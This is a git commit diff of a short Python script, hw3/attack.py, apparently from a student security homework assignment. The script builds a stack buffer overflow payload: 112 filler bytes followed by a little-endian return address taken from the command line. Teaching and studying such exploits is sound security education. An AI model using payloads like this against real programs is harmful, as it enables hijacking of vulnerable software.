cfa60d306a1376c2cda4967bbc20817f4f135aae
Taylor Foxhall <lxmachina@gmail.com>
2016-10-30 16:06:27 -0400

    actually follow the parameters of the assignment

--- hw3/attack.py
+++ hw3/attack.py
@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 import sys
 
-TARGET = b'\xfb\x8a\x04\x08' # little endian
-_, buflen = sys.argv
-junk = b'\xaf' * (int(buflen) + 12)
+_, target = sys.argv
+buflen = 100
+junk = b'\xaf' * (buflen + 12)
 sys.stdout.buffer.write(junk)
-sys.stdout.buffer.write(TARGET)
+
+ret = int(target, base=16).to_bytes(4, byteorder='little')
+sys.stdout.buffer.write(ret)
